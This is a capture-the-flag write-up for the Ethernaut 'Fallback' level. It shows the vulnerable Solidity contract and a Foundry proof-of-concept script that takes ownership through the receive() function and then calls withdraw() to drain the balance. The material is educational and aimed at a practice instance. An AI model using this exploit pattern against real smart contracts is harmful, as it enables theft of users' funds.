---
title: Fallback
weight: 2
type: docs
next: fal1out
prev: hello-ethernaut
---

[Level1](https://ethernaut.openzeppelin.com/level/1) - ⭐

---

- How to send ether when interacting with an ABI

![Untitled](Fallback%209c93f3e046fa42eb834974a2469dec8c/Untitled.png)

- How to send ether outside of the ABI
- Converting to and from wei/ether units (see `help()` command)
- Fallback methods
  ![Untitled](Fallback%209c93f3e046fa42eb834974a2469dec8c/Untitled%201.png)
  ![Untitled](Fallback%209c93f3e046fa42eb834974a2469dec8c/Untitled%202.png)

  ```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract Fallback {

    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
      owner = msg.sender;
      contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
          require(
              msg.sender == owner,
              "caller is not the owner"
          );
          _;
      }

    function contribute() public payable {
      require(msg.value < 0.001 ether);
      contributions[msg.sender] += msg.value;
      if(contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
      }
    }

    function getContribution() public view returns (uint) {
      return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
      payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
      require(msg.value > 0 && contributions[msg.sender] > 0);
      owner = msg.sender;
    }
  }
  ```

  1. Call the `contribute()` function with a value set to 1 wei.
  2. Call `senTransaction()` with 1 wei also to get ownership of the contract.
  3. Call `withdraw()` to extract the funds from the contract.
     This is frustrating to using the web console to interact with the contract. So I will try to redo the challenge but using foundry this time.
     Let’s start with the same template as before but with the new contract instance address:

  ```solidity
  // SPDX-License-Identifier: UNLICENSED
  pragma solidity ^0.8.13;

  import "forge-std/Script.sol";

  interface Callee {
  }

  contract POC is Script {
      Callee level0 = Callee(0xCe9D58330C2623e00018a10164399238723A4F01);
      function run() external {
          uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
          vm.startBroadcast(deployerPrivateKey);

          vm.stopBroadcast();
      }
  }
  ```

  It is stated that we have to :

  1. claim ownership of the contract
  2. reduce its balance to 0
     This time it’s easier to get the contract interface since we directly have access to the contract source code.

  ```solidity
  interface Callee {
    function owner() view external returns(address);
    function contribute() external payable;
    function withdraw() external;
    function getContribution() external view returns (uint);
  }
  ```

  This is the corresponding interface of the function we are going to utilize.
  From here, everything is quite simple. After a close look at the contract source code we came with the following PoC:

  ```solidity
  contract POC is Script {
      Callee level1 = Callee(0x7f584a9D74D461eFDaD062AA9AfEe9629b96c780);
      function run() external {
          uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
          vm.startBroadcast(deployerPrivateKey);

          console.logUint(level1.getContribution());
          console.logAddress(level1.owner());

          level1.contribute{value: 1}();
          (bool sent,bytes memory data) = address(level1).call{value: 1}("");
          require(sent, "Failed to sennd Ether");
          console.logBytes(data);

          console.logUint(level1.getContribution());

          level1.withdraw();

          console.logUint(level1.getContribution());
          console.logAddress(level1.owner());

          vm.stopBroadcast();
      }
  }
  ```
